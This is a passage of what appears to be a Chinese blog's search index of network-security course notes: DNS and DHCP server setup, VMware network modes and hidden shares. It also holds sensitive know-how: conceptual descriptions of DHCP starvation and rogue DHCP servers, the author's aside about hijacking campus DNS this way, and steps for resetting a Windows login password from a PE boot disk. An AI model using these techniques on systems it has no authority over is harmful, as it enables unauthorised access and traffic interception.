管理工具进行部署。添加网站，以及网页。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DNS部署与安全2","date":"2020-08-04T09:30:30.000Z","path":"2020/08/04/2020.08.04 DNS部署与安全2/","text":"第十一章、DNS部署与安全2主DNS服务器部署步骤：12345678910111213141516171819202122232425262728293031323334353637381. 打开 windows 镜像文件所在光盘。按照组件，找到域名系统（DNS）。进行安装。 1) 一旦安装完成之后。计算机 TCP53 和 UDP53 两个端口都被打开了。 2) 即使你没有修改 DNS 配置，但是它自带访问根域的地址。所以，只要你这太域名解析服务器能够上网，他就能给客户机提供域名解析服务(虽然工作效率慢了点)。 2. 正向查找区域： 1) 新建一个区域。主要区域(该区域负责该域名，也就是进行权威解析)，辅助区域(主要区域的备份或辅助工作)，根域(用不到)。 2) 创建区域解析文件(.dns 结尾)。所有该域名，和子域名的 DNS解析文件，都保存在此文件中。 3) 自动更新，保持不变就行。此操作设计到 域 知识。 4) 新建成功后几个参数的含义； (1) &quot;起始授权机构（SOA）&quot;：表示该域名的负责服务器是谁。 (2) &quot;名称服务器(NS)&quot;：表示可以给该域名做解析的 DNS 服务器有那些。一般有主域服务器，和辅助服务器。通俗的讲就是我认为合法的服务器。 (3) 别名（&quot;CNAME&quot;）：表示给正向解析记录，新建的一个别名解析。比如，给 www.fangning.com 新建另外一个名称 www2.fangning.com。两个域名指的是同一条解析记录。 别名也叫 Aliases。其实百度服务器的别名是，www.baidu.com。真名叫 www.a.shifen.com。 (4) &quot;主机A&quot;：正向解析记录。 (5) &quot;PTR&quot;记录：反向解析记录。 (6) &quot;MX&quot;：邮件交换记录。邮箱地址也是相当于一种域名，所以也需要进行解析。发送邮箱的时候，需要对目标邮箱进行解析。3. 新建一个正向解析记录(A记录)： 1) 右键-&gt;新建主机。就是给主域名增加一个对辅助域名的正向解析记录。比如给 zzuli.edu.cn 增加一个 acm.zzuli.edu.cn 服务主机的域名解析。 2) 配置以下虚拟机的 DNS服务器指向，然后用命令行 nslookup 或 ping 检验一下。 3) 如果需要给公司所有人修改，那么就需要修改 DHCP 地址池的 DNS配置。4. 在使用 nslookup 进行域名解析的时候，如果想要显示被访问的 DNS 服务器名称。将 UnKnown 该成服务器名称。 1) 先需要在正向解析里面，添加一个主机(A记录)，地址填该服务器的地址，主机名称一般取 dns1。 2) 建立的时候，需要勾选同时建立反向解析指针(PTR)。这时就会出现一条域名解析记录 dns1.fangning.com -&gt; 192.168.190.2 3) 需要添加一个&quot;反向查找区域&quot;。反向查询区域，要设置成 DNS服务器所在的网段。 4) 在该区域列表中，新建一个方向解析指针 PTR。所指对象，从正向解析主机记录列表里面进行查找。5. 另外一台客户机，进行DNS验证时，必须保证能够ping通该域名解析服务器。并且设置DNS地址为需要验证的服务器地址。6. 配置 DNS 转发器： 1) 在 DNS服务器管理工具中，右击服务器-&gt;属性 2) 填写配置好的另外一台被转发的 DNS服务器。 3) 注意，两台通过DNS转发器连接的服务器之间，相互必须要求可以ping通。所属同一局域网，或者能够连接 Internet。 4) 在本地DNS服务器解决不了的时候，就通过DNS转发器，进行递归查询。 5) 同时另外一台DNS服务器上面，需要添加好所需要的主机(A记录)。这样子，就可以通过客户机，指向 DNS1，再通过转发器访问 DNS2 -&gt; 从而获取第二台服务器上面的解析记录。 辅助区域（域名）部署步骤12345678910111213141. 1) 首先，辅助区域，并不是辅助 DNS服务器。这是针对&quot;负责域名&quot;的&quot;区域&quot;的一个备份类似。 2) 这个实验是再两台 win2003 服务器里面的 DNS管理工具中做的。以下简称 dns1 和 dns2。2. 在dns1中，选中正向解析中建立的&quot;区域&quot;，右击属性，找到区域复制。 1) 允许区域复制。 2) 修改权限为，只允许到下列制定服务器。 3) 在辅助服务器列表，添加&quot;dns2&quot;的地址。这一步的作用就是，设置谁可以复制我？？3. 在dns2中，右击-&gt;新建&quot;区域&quot;。 1) 新建辅助区域。 2) 输入你准备从谁哪儿进行&quot;同步&quot;，输入dns1的服务器地址。 3) 以后当主区域进行一些更新操作的时候，辅助区域会进行自动同步。 给已有的A记录，新建别名 在 正向查找区域，右键，新建一个 Cname 记录。指向 www.baidu.com 别名的作用就是，给 www.baidu.com 另外取一个名字，比如 www2.baidu.com。 这样，客户机，无论访问哪一个域名，最终都是指向同一台服务器，访问的地址其实是同一个。 关于虚拟机网络连接问题 虚拟机中十九个交换机 Vmnet1 ~ Vmnet19。其中，Vmnet0并没有包含其中。因为，该交换机，连接到真实机的网卡上面。因此可以把它看作是一个真实的交换机，可以分配有效真实的 IP 地址。 真实客户机，都包含两个网卡。一共使无线 WLAN 网卡，一个是有限以太网卡。 因此，在配置虚拟机桥接真实网络的时候。一定要确保 VMnet0 所连接的网卡，和你正在正常使用的网卡是相同的。 比如，你正在使用无线网络，但是Vmnet0 连接的是真实机的有线网卡。那虚拟机仍然不能够上网。 WireLess 无线。 1234567891. 配置虚拟网络编辑器，修改 Vmnet0 外部连接方式。把&quot;自动&quot;，修改成能够连接互联网的那一个网络适配置。 2. 修改虚拟机网络连接方式为&quot;桥接&quot;，或者直接修改连接到 Vmnet0 虚拟交换机上。3. 修改虚拟机网络配置方式为 &quot;DHCP 自动获取IP&quot;。4. 清空 &quot;DNS缓存&quot;， ipconfig /flushdns5. 使用 ping 命令来测试是否能够连接上外部网络。 还原 DNS服务器 在 DNS 管理工具中，删除 新建的正反向查找区域。 点击 查看 -&gt; 高级。此时会出现，DNS 缓存。 右击缓存查找，清除缓存。 此时，缓存清除了，负责域名的区域删除了，还要删转发器。 点击转发器，删除所建立的转发器。 相关指令1234561. 命令 ipconfig /flushdns 1) flush dns：指的是刷新dns缓存，也就是&quot;清除客户机的域名解析缓存记录&quot;。 2) 一般使用场景是，客户机缓存遭恶意篡改，或者是本低 DNS服务器进行一些错误修改后。2. 命令 ipconfig /displaydns 1) 查看本地已缓存的 DNS域名解析记录。 相关经验 之前有一次电脑网络出问题了。原因是，网络只能上QQ，不能使用浏览器。 可能是计算机中了恶意病毒，当时找遍全网的解决教程，才发现是 Internet 缓存的问题。 不是DNS域名解析问题，也不是IP地址的网络等配置问题，居然是个啥缓存问题？？？为什么？？ 现在应该知道了，客户机做域名解析的时候，先查看本地缓存，然后查看Host文件。当时情况下，我的域名解析缓存可能被篡改了，所以导致我浏览器域名解析不了。所以，清空缓存就行了。 本地缓存可以通过 ipconfig /displaydns 查看。 Host文件可以通过记事本打开，在 c:\\windows\\system32\\drivers\\etc\\hosts 中，其中hosts是一个无属性文件。 在虚拟机中如果是做攻击操作，千万不能将虚拟机调到真实网络当中。也就是，一般都用 Host-Only 模式， 否则容易导致真实机瘫痪！！！！ Aliases：别名，在 DNS 服务器中，可以给域名起别名。在 Linux 中也可以给使用十分频繁的命令起别名。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DNS部署与安全","date":"2020-08-02T09:30:30.000Z","path":"2020/08/02/2020.08.02 DNS部署与安全/","text":"第十一章、DNS部署与安全1、DNS123451. 客户机域名解析步骤：缓存 -&gt; Host文件 -&gt; DNS服务器。 (1) 中大型公司一般都用自己部署的 DNS 服务器，而不是公共ISP提供的 DNS 服务器。 (2) Domain Name Service：域 名 服务。 (3) 为客户机提供域名解析服务。 2、域名组成一、概述 “www.sina.com.cn&quot;，严格来说 “sina.com.cn” 才是一个域名。”www”只是一个主机名。 “主机名.域名” 称为 完全限定域名（FQDN: full quality dymain name）。一个域名下，可以配置多个主机名，比如 www.baidu.com ，或者 mail.baidu.com 。主机的功能如果是网址用 www，博客 blog，邮件 mail。 一般要是买域名的话，可以去阿里云，有域名服务。除此之外，阿里云还可以买云空间，买云服务器等等。 二、组成结构 ​ 注：该图片中二级域名应该改成一级域名，后面依次改。 顶级域名很昂贵，com、net、org、edu等等。我们一般购买的一级域名，可以自己取名字。 而二级域名一般是主机名，只要你掌握了上一级域名，你就可以拥有该等级及以下等级的域名使用权限。 比如 www.acm.zzuli.edu.cn. 从后往前看，分别是： 根域-&gt;顶级域(中国)-&gt;一级域(学校服务器)-&gt;二级域(acm实验室服务器) -&gt;三级域(网页)。 3、端口 TCP 53 UDP 53 4、DNS解析种类 客户机域名解析过程： 首先客户机先查看自己的缓存，如果没有，再查看Host文件，也没有。那就需要将域名发送到所指的本地 DNS 服务器，请求域名解析。 如果该服务器缓存有该域名，那么将解析结果返回到客户机。这个过程，叫做递归查询。 如果本地 DNS 服务器没有该域名缓存，也不是负责该域名的服务器。 那么，该 DNS 服务器就会从 根域开始，进入一种迭代查询，知道找到负责 baidu.com 域名的服务器。 负责该域名解析的服务器：比如 baidu.com 是一个域名，那就存在一个专门负责以该域名结尾的域名解析。比如 www.baidu.com 或 mail.baidu.com 都由一个专门的服务器来解析。 权威解析结果：由负责该域名结尾的域名解析服务器解析出来的结果。 迭代查询过程中 先问 根域，根域会提供一个间接的服务器地址——顶级域名 .com 服务器。 顶级域名服务器也提供一个 一级域名服务器地址 —— baidu.com 域名服务器。 一级域名 baidu.com 服务器专门负责该域名结尾，所以能够进行解析，返回 www.baidu.com 的解析结果到本地 DNS 服务器。 返回递归查询出口，由 DNS 服务器将结果返回给客户机。并且该DNS服务器，会记下缓存下该域名的解析结果，方便下次查找。 公司内部的 DNS 服务器： 自己搭建的 DNS 服务器，也会知道全世界 根域 的地址。但是，这样子查询域名的过程太慢。 所以，一般如果自己没有缓存，也不是负责该域名的服务器。那公司内部的 DNS 服务器，会利用 DNS转发器，来寻求公网的 DNS 服务器的帮助。 DNS 转发器过程，是一个 递归查询过程。只问结果，所答即所答。公司内部DNS服务器甩锅！给公网DNS服务器。 123456789101112131. 按照查询方式分类： 1) 递归查询：所问即所答。你给我的答案，就是我所需要的。 (1) 客户机 与 本低DNS服务器 之间。 (2) 公司内部 DNS服务器 通过 DNS转发器 与 公网DNS服务器之间。 2) 迭代查询： (1) 本低DNS服务器 与 负责各域名的服务器 之间。 (2) 比如 各根域服务器，各顶级域服务器， 各一级域服务器...... 2. 按照查询内容分类： 1) 正向解析：已知域名，解析IP地址。 2) 逆向解析：一直IP地址，解析域名。 DNS服务器分类 主要名称服务器：某域名的主要负责服务器。（公司内部可能拥有） 辅助名称服务器：主要服务器的辅助服务器。（公司内部可能拥有） 根名称服务器：全世界十三台根域辅助服务器。（全世界仅有 13 台） 高速缓存名称服务器：自己不负责任何域名的解析，只是作为一个中介人，进行转发解析，然后缓存过程记录。（公司内部可能拥有） 相关经验 全世界的根域一共有十三处，其中九处在美国。国内没有，只有根域服务器的镜像。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"虚拟机三种网络模式","date":"2020-08-01T10:30:30.000Z","path":"2020/08/01/2020.08.01 转发关于VMware的网络状态/","text":"前言很多人安装虚拟机的时候，经常遇到不能上网的问题，而vmware有三种网络模式,对初学者来说也比较眼花聊乱，今天我就来基于虚拟机3种网络模式，帮大家普及下虚拟机上网的背景知识。(博文原创自http://www.cnblogs.com/ggjucheng/archive/2012/08/19/2646007.html) 虚拟机网络模式无论是vmware,virtual box,virtual pc等虚拟机软件，一般来说，虚拟机有三种网络模式: 1.桥接 2.NAT 3.Host-Only 初学者看到虚拟机有三种网络，估计就慌了，笔者也是。哪一种网络是适合自己的虚拟机呢？ 桥接 桥接网络是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。 所以当我们要在局域网使用虚拟机，对局域网其他pc提供服务时，例如提供ftp，提供ssh，提供http服务，那么就要选择桥接模式。 例如大学宿舍里有一个路由器，宿舍里四个人连接这个路由器，路由器的wanip就不理会了，这个ip是动态获取的，而lanip默认是192.168.1.1,子网掩码是255.255.255.0。而其他四个人是自动获取ip，假设四个人的ip是: A:192.168.1.100/255.255.255.0, B:192.168.1.101/255.255.255.0, C:192.168.1.102/255.255.255.0, D:192.168.1.103/255.255.255.0 那么虚拟机的ip可以设置的ip地址是192.168.1.2-192.168.1.99,192.168.1.104-192.168.1.254(网络地址全0和全1的除外，再除去ABCD四个人的ip地址) 那么虚拟机的ip地址可以设置为192.168.1.98/255.255.255.0,设置了这个ip地址，ABCD这四个人就可以通过192.168.1.98访问虚拟机了，如果虚拟机需要上外网，那么还需要配置虚拟机的路由地址，就是192.168.1.1了，这样，虚拟机就可以上外网了，但是，上网我们一般是通过域名去访问外网的，所以我们还需要为虚拟机配置一个dns服务器，我们可以简单点，把dns服务器地址配置为google的dns服务器:8.8.8.8,到此，虚拟机就可以上网了。 NATNAT模式中，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。 NAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡，是在vmware提供的一个虚拟网络。 NAT和桥接的比较: (1) NAT模式和桥接模式虚拟机都可以上外网。 (2) 由于NAT的网络在vmware提供的一个虚拟网络里，所以局域网其他主机是无法访问虚拟机的，而宿主机可以访问虚拟机，虚拟机可以访问局域网的所有主机，因为真实的局域网相对于NAT的虚拟网络，就是NAT的虚拟网络的外网，不懂的人可以查查NAT的相关知识。 (3) 桥接模式下，多个虚拟机之间可以互相访问；NAT模式下，多个虚拟机之间也可以相互访问。 如果你建一个虚拟机，只是给自己用，不需要给局域网其他人用，那么可以选择NAT，毕竟NAT模式下的虚拟系统的TCP/IP配置信息是由VMnet8(NAT)虚拟网络的DHCP服务器提供的，只要虚拟机的网路配置是DHCP，那么你不需要进行任何其他的配置，只需要宿主机器能访问互联网即可，就可以让虚拟机联网了。 例如你想建多个虚拟机集群，作为测试使用，而宿主机可能是一个笔记本，ip不固定。这种应用场景，我们需要采用nat模式了，但是我们要考虑一个问题，虚拟机之间是需要互访的，默认采用dhcp，虚拟机的ip每次重启，ip都是不固定的，所以我们需要手工设置虚拟机的ip地址。 但是我们对虚拟机网卡所在的虚拟网络的信息还一无所知，例如虚拟机网络的路由地址，子网掩码，所以我们需要先查下nat虚拟网络的信息。 使用vmware,在Edit-&gt;Virtual Network Editor中配置好虚拟网络信息后看到下图所示，注意VMnet8，VMnet8相当于是本机的一个路由，虚拟机设置NAT后就通过这个路由进行上网的，可以查看其网络地址，路由地址，子网掩码。 选择VMnet8-&gt;NAT设置,可以看到子网ip显示为192.168.233.0，子网掩码是255.255.255.0，那路由地址呢，其实就是网关IP了，都是同个东西，这里是192.168.233.2。 接下来就好办了，在对应的虚拟机设置好ip，子网掩码，路由地址就可以上外网了，至于dns可以设置为8.8.8.8. Host-Only 在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的。 Host-Only的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。这个功能或许对普通用户来说没有多大意义，但大型服务商会常常利用这个功能。如果你想为VMnet1网段提供路由功能，那就需要使用RRAS，而不能使用XP或2000的ICS，因为ICS会把内网的IP地址改为192.168.0.1，但虚拟机是不会给VMnet1虚拟网卡分配这个地址的，那么主机和虚拟机之间就不能通信了。 综述 在VMware的3中网络模式中，NAT模式是最简单的，基本不需要手动配置IP地址等相关参数。至于桥接模式则需要额外的IP地址，如果是在内网环境中还很容易，如果是ADSL宽带就比较麻烦了，ISP一般是不会大方的多提供一个公网IP的。","link":"","tags":[{"name":"转发","slug":"转发","permalink":"http://www.fangning.xyz.com/tags/%E8%BD%AC%E5%8F%91/"}]},{"title":"DHCP 部署与安全","date":"2020-07-31T15:30:30.000Z","path":"2020/07/31/2020.07.31 DHCP部署与安全2/","text":"第十二章、DHCP部署与安全部署DHCP服务器1234567891011121314151617181920212223242526272829303132333435363738394041424344451. 首先 DHCP服务器 和 客户机 需要桥接到同一段网络。如果是虚拟环境，就是两台虚拟机连接进入同一台交换机，比如 VMnet1。然后配置同一网段的 IP。2. 部署一台服务器需要服务器软件，打开相应的端口。所有微软自带的服务器软件都在&quot;管理工具&quot;里面。 (1) 如果没有。对于 windows2003 以及之前的系统，&quot;需要重新插入系统光盘&quot;，然后可以打开光盘文件。 选择&quot;络信息服务(IIS)&quot;，打开，然后从里面找到需要的&quot;动态主机配置协议 DHCP&quot;进行安装。 (2) 如果是 win10 或则 win2008 改程序默认是可能是安装了的，也可能是没有。 如果没有安装，去控制面板，windows程序启动里面找。 如果安装了该服务，去 services.msc 里面进行激活。3. 这一步可能安装失败，因为你需要部署DHCP的服务器自身的地址是需要自己&quot;手动配置&quot;的。所以，先得给自己配好 IP。自己的 IP 也必须和员工的 IP 同属于一个网段。 (1) 并且，在地址池里面不能存自己的这个 IP。公司里面如果还有其他需要，或者部署多台 DHCP 服务器，或者其他服务器。都需要&quot;预留&quot;一些 IP 地址。也就是，员工的 IP 可以设置从 10 或者 20 开始。 (2) 当你给服务器本身配置好之后，DHCP服务软件就可以安装成功了。4. 此时用 netstat /n 查看端口号的时候，会发现多了&quot;UDP67&quot; 和 &quot;UDP68&quot; 两个端口号。这&quot;两个都是动态主机配置协议服务&quot;所属的端口号。 (1) 客户机的 DHCP Discovery 和 DHCP Requst 是通过这两个端口入站的。 (2) 服务器的 DHCP offer 包 和 DHCP ACK 包也都是从这两个端口出战的。5. 启动地址池(微软叫&quot;作用域&quot;): (1) 打开刚刚所安装的 DHCP 服务软件。这里面可以选择关闭该服务。 (2) 选择服务器图标，右击&quot;新建作用域&quot;。最好最前面预留一部分，最后面预留一部分。注意排除广播地址和 网段地址，以及网关地址。 (3) 设置地址分配范围。 (4) 设置子网掩码。 (5) 设置租期策略，设置一个合适的 IP 租约长度。 (6) 配置 DHCP选项，也就是网关，DNS服务器等。对于DNS配置的话，你的公司向 &quot;网络服务提供商（ISP）&quot;买网的时候，他会给你的一个固定的公网 IP。并且提供一个说明文档，里面有写这一片区域所部署的 DNS 服务器地址. (7) 如果需要配置 WINS 服务器，以及父域这种。都不需要配置，这些已经淘汰。 (8) 是否激活作用域，一般建议先不激活作用域。 退出检查地址池，地址租约，作用域选项一切检查没有错误，再进行激活。 6. 部署号 DHCP 服务器后，打开客户机进行检查验证一下。 (1) 停用一下客户机的网卡，然后再启用，这时候计算机就会再次请求 IP。发送 Discovery 包。 (2) 然后查看网络详细信息，检查IP，DNS，网关，等等信息。 (3) 若客户机所在局域网内没有 DHCP 服务器，或者 DHCP 服务器没有配置有效的地址池。那么就会自动获取 IP 失败。此时会获得一个无效的IP地址&quot;169.254.233.86&quot;。7. &quot;注意&quot;: 如果在虚拟机中做该实验，必须先关闭虚拟机交换机所提供的 DHCP 服务，免得与自己部署的 DHCP 服务产生冲突。 (1) 点击 VMware 的虚拟网络编辑器。使用管理员身份打开。选中使用的交换机。 (2) 将使用本低 DHCP 服务取消勾选。 8. 保留功能： (1) 在企业公司内，一般情况下，有些客户机的 IP 是要求固定的。也就是，每天下班，上班打开计算机，内部的IP总不能经常变动。 (2) 所以，这就可以利用DHCP服务器管理工具里面的&quot;保留功能&quot;。将客户机的MAC地址，与地址池里面特定的IP进行绑定。9. DHCP服务器备份： (1) 无论是在学校还是公司企业，都不可能只有一个局域网。这种情况只需要在一台 DHCP 服务器上部署多个作用域就行了。 (2) 这样，一旦服务器崩溃，重新布置会很麻烦。所以给 &quot;DHCP配置做备份就很必要&quot;。 同时创建多个作用域，可以简化 新建的多个作用域，他们的 DNS 可以是一样的。因此可以在 服务器选项里面，设置父类的 DNS 配置。 这样，多个作用域选项，就会继承父亲服务器选项里面的 DNS 配置。 如果子类里面想要单独设置 DNS，可以再到自己的作用域选项里面进行设置。作用域选项 &gt; 服务器选项。 相关命令12345671. ipconfig /release (1) 手动释放 DHCP 获取的 IP。即使 IP 租约没到期，可以提前归还。2. ipconfig /renew (1) 若当前有 IP 地址，这条命令表示进行续约。发送 DHCP Request (2) 若当前没有获得 IP 地址，这条命令表示请求 IP。发送 DHCP Descovery 相关经验 凡是服务器软件，装上之后，都会给计算机打开一个相应的端口。 有关 Vmware 的三种网络状态： 理解请看：http://www.cnblogs.com/ggjucheng/archive/2012/08/19/2646007.html 拓扑图理解：https://zhuanlan.zhihu.com/p/24758022 1234567891011121314151. 桥接模式： (1) 物理机网卡 与 虚拟机网卡 一起桥接在虚拟交换机VMnet0 上。此时物理机与虚拟机同属一个网段，两者平级，两者可以互相通信。 (2) 给虚拟机配置真实路由地址(网关)，就可以实现虚拟机访问外网。再给虚拟机配置 DNS 服务器地址，就可以使用浏览器域名访问外网。 (3) 采用桥接模式下，虚拟机就相当于一台真实机，存在外部真实网络当中。一般用来提供 ftp，ssh,http等服务。 2. Net模式： (1) net模式下，虚拟机存在于内部的虚拟网络当中。虚拟机网卡 和 物理机网卡 不属于同一网络当中。因此，外部真实网络设备，无法访问虚拟网络内的虚拟机。但是，也不是所有外部网络都无法访问虚拟网络，&quot;宿主机除外&quot;。 (2) 但是，内部的虚拟机，却&quot;可以公网&quot;。它可以借助 NAT(网络地址转换) 功能，通过宿主机访问公网。 (3) 采用net模式下，虚拟机可以在虚拟内部网络通信，也可以访问外部真实网络。 默认采用的是虚拟交换机的DHCP服务配置IP信息，因此可以由于关机，和 IP租期，导致虚拟机IP不确定。 可以采用手动配置虚拟网络IP,该虚拟网络的虚拟子网，网关，子网掩码，地址池 IP 范围等信息可以在虚拟机 编辑 -&gt; 虚拟网络编辑器 -&gt; VMNet8交换机 中查看。3. Host-Only模式： (1) Host-Only模式下，虚拟机处于虚拟网络，并且虚拟网络是一个完全封闭的网络。 (2) 该模式下，虚拟机仅仅只能访问主机。就像是少了 Net 功能的 Net模式。 关于 win10 如何打开DHCP。直接 win+r -&gt; services.msc -&gt; 打开DHCP服务就行。 win10 有些服务默认是关闭且不显示的，比如 Telnet 远程服务。 需要在 控制面板 -&gt; 程序 -&gt; 启动或关闭windows程序 里面找到 Telnet 程序打开 还可以打开 win10 的IIS(Internet Information system)服务，包括FTP、web等功能。 交换机对外作用是将局域网地址表现成成一个公网地址，对内将路由器数据进行分发。 而路由器，就是连接外网的设备。 如果自己电脑网络出问题：拔网线，重启网络，release，renew，手动配置IP，DHCP自动获取IP，重启电脑。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DHCP 部署与安全","date":"2020-07-31T10:30:30.000Z","path":"2020/07/31/2020.07.31 DHCP部署与安全/","text":"第十二章、DHCP部署与安全DHCP作用，概念，优点，原理(租约过程)1234567891011121314151617181920212223242526272829303132333435363738391. 作用： (1) Dynamic Host Configure Protocol：好理解一点就是动态域名配置协议！ (2) 自动分配 iP 地址。 2. 地址池/作用域： (1) 存放ip地址等信息的服务器。IP、子网掩码、网关、DNS、&quot;租期&quot;。3. DHCP优点： (1) 减少工作量(自动获取IP)、避免 iP 冲突、提高地址利用率(减少租期)。4. &quot;DHCP 原理&quot;: 也就是 DHCP 租约过程，分为 4 个步骤： (1) 客户端 发送 DHCP Discovery 广播包。 客户机广播请求 IP 地址（包含客户机的 MAC 物理地址）。 也就是说需要先找到动态域名配置服务器做出请求，并且告诉它，我的唯一标识。此时&quot;一台客户机可能会伪造多个mac地址&quot;。 (2) 服务器 响应 DHCP Offer 广播包。 服务器响应提供 IP 地址（但无子网掩码，网关，DNS域名解析等信息）。 此时可能&quot;不止一台服务器响应&quot;，也许有多台服务器为该物理地址提供 offer包。 先给你看看 IP ，如果觉得可行了，被接受了，再给你后续掩码和域名解析。 (3) 客户端 发送 DHCP Request 广播包。 此时，当客户端收到多份 offer包 时，进行选择IP。 做完选择后，我继续发送请求，请求子网掩码，网关等后续信息参数。 此时，未被选择的 dhcp服务器，可能有些不回话，有些回话。 (4) 服务器 发送 DHCP ACK 广播包 服务器确定了租约，并且提供网卡详细参数 IP、掩码、网关、DNS、&quot;租期&quot;等。5. &quot;DHCP&quot;续约原理； (5) 获得 ACK 包后，会有一个 iP 有效期（租期）。当租期过半 50% 后，客户机会继续向原来的 DHCP 服务器发送 Request 包。请求续约。 如果续约成功，之前的租期作废，新的租期从重新获得 ACK 包开始计时。 如果请求未得到响应，在租期过 87.5%。也就是只剩 1/8 的时间，再次发送 DHCP Request 包，进行请求续约。如果还没得到回应，那么该客户机将重新发送 DHCP Discovery 广播包，请求IP地址。 若无任何其他 DHCP服务器响应，客户机自动给自己分配一个 169.254.x.x/16 无效的ip地址。如果该局域网其他客户机也被自动分配了该网段的无效地址。还是可以 ping 通&quot;进行局域网通信&quot;。但是不能连接互联网。 &quot;注&quot;：关于租期的长短设置，如果是公共场所，人流量比较大的话，最好设置租期短一些，以免造成 iP 地址浪费。如果是企业公司里面，人员比较固定，可以把租期设长一些，减小 DHCP 服务器分配ip的压力。 (6) 当客户机不再需要 IP 地址时，便会通知服务器已&quot;释放了 IP 地址&quot;。此通知一般在&quot;改手动配置ip时发送&quot;，也可以&quot;手动发送&quot;（ipconfig /release）。 DHCP攻击与防御123456789101112131415161. 攻击 DHCP服务器： (1) 一些客户端系统，比如 Linux kali。可以伪造 MAC 物理地址。然后不断地向 DHCP 动态主机配置协议服务器 发动 DHCP discovery 广播包。以此来占用服务器地址池里面的地址。 (2) DHCP 服务器本身并没有这种防御和甄别机制，并且每完成一个租约，都会写一个租约列表。以此来记录那些ip地址是正在服役。这些租约未到期的ip地址是不能够再次提供给他人。所以，如果受到 DHCP 攻击，很容易造成服务器瘫痪。2. 仿造 DHCP服务器攻击客户机： (1) 当客户机发送 DHCP Discovery 广播包的时候，如果仿造的 DHCP 服务器响应的 Offer 广播包先被客户机接受到。那么后续就会给该客户机提供不合法的 IP 地址。 (2) 不和法的 IP 地址，有一个租约，租约未到期限的 50%，你不能重新获取 iP。3. DHCP服务器 防御： (1) 对于同一台计算机仿造物理地址，可以通过&quot;管理型交换机&quot;进行&quot;mac地址绑定&quot;。一般的普通傻瓜式交换机无此功能。 (2）客户机发送的 dhcp discovery 包需要通过交换机进行传输，然而如果交换机在中间进行拦截判断其中的mac地址，发现同一端口连接的客户机发送的mac地址有变化，就会拦截该广播包，并且做出警报！ (3) 这种交换机的该功能，实现的就是将 交换机端口 与 连接的客户机连接的Mac 地址进行一对一绑定。因为需要获取 DHCP Discovery包中的信息，所以该交换机需要能够&quot;识别 DHCP 协议&quot;。 4. 仿造DHCP 漏洞防御： (1) 同样利用 &quot;管理型交换机&quot;。监控所有交换机端口，只规定特定的端口发送 DHCP Offer 包，其他端口一律不允许发送 DHCP Offer包，这样一来仿造部署的DHCP 虚假响应就无法发送出去，在交换机端口阀门上被拦截。 相关经验 DHCP 协议的四次动作，只有前两次动作是比较危险的。第一阶段的客户机发送的discovery包，可能被大量伪造。第二阶段服务器回应的 offer 包也可能被伪造。后面两个阶段，客户机发送 request 请求包，以及 服务器回应的 ACK 包都是定向数据传输，所以很难伪造。 能不能人为伪造发送释放 IP 地址的信息给服务器，让正常服役的IP租约给不断作废了。 如果在学校内网，或者是校园内的局域网布置一台 DHCP 服务器，然后在 IP 配置里面 再把DNS指向自己搭建的 域名解析服务器。那岂不是尽在掌握之中。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"用pe系统破解开机密码","date":"2020-07-30T10:30:30.000Z","path":"2020/07/30/2020.07.30 PE系统启动破解开机密码/","text":"如何用 PE 系统破解开机密码步骤： 12345678910111213141. 下载一个 PE 系统制作工具。2. 制作一个 PE 系统镜像文件，用于虚拟机启动。 或则制作一个系统启动盘，把系统装进U盘，用于物理机使用。3. 插入启动U盘，或者光盘。重启计算机。4. 进入计算机固件系统，也就是 BIOS 系统。一般的牌子机，也就是个人笔记本电脑都有这玩意。一些专用服务器应该没有。5. 修改启动引导顺序。将 CDROM / USB 移动到最上面，或者直接 enter 进入相应应导。6. 进入 PE 系统后，一般里面会集成一些专业的应用软件。比如破解开机密码，磁盘分区助手，以及释放镜像。7. 运行破解开机密码，破解 SAM 文件，选中需要破解的用户名，然后输入新设置的密码。重启！成功！","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"文件共享服务器2","date":"2020-07-30T08:34:30.000Z","path":"2020/07/30/2020.07.30 共享文件服务器2/","text":"第九章、共享服务器2隐藏共享文件1234567891011121314151617181. 在共享文件的共享名后面加上美元符号&#x27;$&#x27;。 (1) 那么该共享文件在网络上不会被显示，但是却真实存在。 (2) 访问方式，只能通过地址栏输入准确的路径才能访问。eg: \\\\192.168.101.10\\share$2. 一些共享文件名称 (1) ipc$：虽然没有对于共享文件，但是是最危险的一个隐藏共享。通过这一个共享文件，可以访问你计算机的所有资源。 (2) C$：将 c 盘共享出去。3. 工作组： (1) 家在同一个工作组中，人人平等，你可以访问我，我也可以访问你。这种状态就叫做工作组。 (2) 些小型机构，教育行业。很多行业都是属于工作组状态。 (3) 查看方式：右击我的电脑属性，一般情况我们的计算机默认都是在 